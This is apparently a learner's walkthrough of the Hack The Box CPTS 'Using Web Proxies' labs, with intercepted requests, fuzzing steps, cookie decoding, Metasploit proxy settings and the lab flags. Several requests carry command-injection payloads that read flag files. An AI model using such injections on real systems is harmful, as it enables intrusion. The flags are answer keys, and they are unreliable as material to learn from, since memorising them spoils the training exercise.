---
title: CPTS labs - 13 Using Web Proxies
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - certification
  - CPTS
  - labs
---
# Using Web Proxies

## [Using Web Proxies](https://academy.hackthebox.com/module/details/110)

### Intercepting Web Requests

Try intercepting the ping request on the server shown above, and change the post data similarly to what we did in this section. Change the command to read 'flag.txt'

```
# After intercepting the request, we enter:
POST /ping HTTP/1.1
Host: 94.237.59.24:51204
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 17
Origin: http://94.237.59.24:51204
Connection: close
Referer: http://94.237.59.24:51204/
Upgrade-Insecure-Requests: 1

ip=1;cat flag.txt
```

The response:

```
HTTP/1.1 200 OK
X-Powered-By: Express
Date: Sun, 20 Oct 2024 18:17:29 GMT
Connection: close
Content-Length: 282

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.030 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.030/0.030/0.030/0.000 ms
HTB{1n73rc3p73d_1n_7h3_m1ddl3}
```

Results: HTB{1n73rc3p73d_1n_7h3_m1ddl3}

### Repeating Requests

**Try using request repeating to be able to quickly test commands. With that, try looking for the other flag.**

The request:

```
POST /ping HTTP/1.1
Host: 94.237.59.24:51204
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 18
Origin: http://94.237.59.24:51204
Connection: close
Referer: http://94.237.59.24:51204/
Upgrade-Insecure-Requests: 1

ip=1;cat /flag.txt
```

The response:

```
HTTP/1.1 200 OK
X-Powered-By: Express
Date: Sun, 20 Oct 2024 18:37:28 GMT
Connection: close
Content-Length: 283

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.034 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.034/0.034/0.034/0.000 ms
HTB{qu1ckly_r3p3471n6_r3qu3575}

```


Results: HTB{qu1ckly_r3p3471n6_r3qu3575}
 
### Encoding/Decoding

Question. 



```
# The provided file contains the text:
VTJ4U1VrNUZjRlZXVkVKTFZrWkdOVk5zVW10aFZYQlZWRmh3UzFaR2NITlRiRkphWld0d1ZWUllaRXRXUm10M1UyeFNUbVZGY0ZWWGJYaExWa1V3ZVZOc1VsZGlWWEJWVjIxNFMxWkZNVFJUYkZKaFlrVndWVmR0YUV0V1JUQjNVMnhTYTJGM1BUMD0=

# It is base64 text. You need to decode in base64 4 times until getting an url encoded. First:
cat encoded_flag.txt | base64 -d | tee encoded2.txt
# U2xSUk5FcFVWVEJLVkZGNVNsUmthVXBVVFhwS1ZGcHNTbFJaZWtwVVRYZEtWRmt3U2xSTmVFcFVXbXhLVkUweVNsUldiVXBVV214S1ZFMTRTbFJhYkVwVVdtaEtWRTB3U2xSa2F3PT0=

cat encoded2.txt | base64 -d | tee encoded3.txt
# SlRRNEpUVTBKVFF5SlRkaUpUTXpKVFpsSlRZekpUTXdKVFkwSlRNeEpUWmxKVE0ySlRWbUpUWmxKVE14SlRabEpUWmhKVE0wSlRkaw==

cat encoded3.txt | base64 -d | tee encoded4.txt
# JTQ4JTU0JTQyJTdiJTMzJTZlJTYzJTMwJTY0JTMxJTZlJTM2JTVmJTZlJTMxJTZlJTZhJTM0JTdk

cat encoded4.txt | base64 -d | tee encoded5.txt
# %48%54%42%7b%33%6e%63%30%64%31%6e%36%5f%6e%31%6e%6a%34%7d

# Enter it in Decoder in Burpsuite 
HTB{3nc0d1n6_n1nj4}
```

Results: HTB{3nc0d1n6_n1nj4}

### Proxying Tools

Question. 
```
# Start metasploit
msfconsole -q

# Then, to set a proxy for any exploit within Metasploitwith the `set PROXIES` flag. 
set PROXIES HTTP:127.0.0.1:8080

use auxiliary/scanner/http/http_put

set RHOSTS https://academy.hackthebox.com/

run
```

Results: msf test file


### Burp Intruder

**Use Burp Intruder to fuzz for '.html' files under the /admin directory, to find a file containing the flag.**

This is the request

```
GET /admin/§flag§.html HTTP/1.1
Host: 94.237.59.246:39867
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1
```

In Burp Intruder set a Snipper attack. Use common.txt as payload. Run it and payload 2010 will return the flag.

Results: HTB{burp_1n7rud3r_fuzz3r!}

 
### ZAP Fuzzer

**The directory we found above sets the cookie to the md5 hash of the username, as we can see the md5 cookie in the request for the (guest) user. Visit '/skills/' to get a request with a cookie, then try to use ZAP Fuzzer to fuzz the cookie for different md5 hashed usernames to get the flag. Use the "top-usernames-shortlist.txt" wordlist from Seclists.**

Results: HTB{fuzz1n6_my_f1r57_c00k13}

### ZAP Scanner

**Run ZAP Scanner on the target above to identify directories and potential vulnerabilities. Once you find the high-level vulnerability, try to use it to read the flag at '/flag.txt'**. 

The vulnerable endpoint contains a command injection vulnerability. This is the request: 

```
GET /devtools/ping.php?ip=|+cat+/flag.txt HTTP/1.1
Host: 94.237.54.253:52356
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Referer: http://94.237.54.253:52356/index.php/2021/08/11/customer-support/
Upgrade-Insecure-Requests: 1

```

And this is the response:

```
HTTP/1.1 200 OK
Date: Tue, 22 Oct 2024 16:54:31 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 156
Connection: close
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>

<html lang="en">

<head>
  <meta charset="UTF-8">
  <title>Ping</title>
</head>

<body>
  HTB{5c4nn3r5_f1nd_vuln5_w3_m155}
</body>

</html>
```

Results: HTB{5c4nn3r5_f1nd_vuln5_w3_m155}


### Skills Assessment - Using Web Proxies

**The /lucky.php page has a button that appears to be disabled. Try to enable the button, and then click it to get the flag.**. 

```
# Intercept traffic qith Burpsuite. Go to the website http://$ip:$port/lucky.php and remove in source code "disabled=""". Then click on the button. You will get a POST request to lucky.php in your intercepted traffic. Send it to Repeater module. Click on Send. Within the response, you will see:
<p style="text-align:center">HTB{d154bl3d_bu770n5_w0n7_570p_m3}</p>
```

Results: HTB{d154bl3d_bu770n5_w0n7_570p_m3}


The /admin.php page uses a cookie that has been encoded multiple times. Try to decode the cookie until you get a value with 31-characters. Submit the value as the answer.. 

```
#  Intercept traffic qith Burpsuite. Go to the website http://$ip:$port/admin.php. See the "Set-Cookie: cookie=4d325268597a6b7a596a686a5a4449314d4746684f474d7859544d325a6d5a6d597a63355954453359513d3d"

# Use Decoder. First, decode as ASCII hex, you will get:
M2RhYzkzYjhjZDI1MGFhOGMxYTM2ZmZmYzc5YTE3YQ==

# Use Decoder. Second, decode as Base64, you will get:
3dac93b8cd250aa8c1a36fffc79a17a
```

Results: 3dac93b8cd250aa8c1a36fffc79a17a


**Once you decode the cookie, you will notice that it is only 31 characters long, which appears to be an md5 hash missing its last character. So, try to fuzz the last character of the decoded md5 cookie with all alpha-numeric characters, while encoding each request with the encoding methods you identified above. (You may use the "alphanum-case.txt" wordlist from Seclist for the payload).** 

![](img/proxy_00.png)

![](img/proxy_01.png)

Results:            HTB{burp_1n7rud3r_n1nj4!}

**You are using the 'auxiliary/scanner/http/coldfusion_locale_traversal' tool within Metasploit, but it is not working properly for you. You decide to capture the request sent by Metasploit so you can manually verify it and repeat it. Once you capture the request, what is the 'XXXXX' directory being called in '/XXXXX/administrator/..'?**. 

```
msfconsole -q
use auxiliary/scanner/http/coldfusion_locale_traversal
options
set RHOSTS $ip
set RPORT $port
set PROXIES HTTP:127.0.0.1:8080

# Go to Burpsuite and check out the request
GET /CFIDE/administrator/index.cfm HTTP/1.1
Host: 94.237.62.154:37883
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14.4; rv:124.0) Gecko/20100101 Firefox/124.0
Connection: close
```

Results: CFIDE

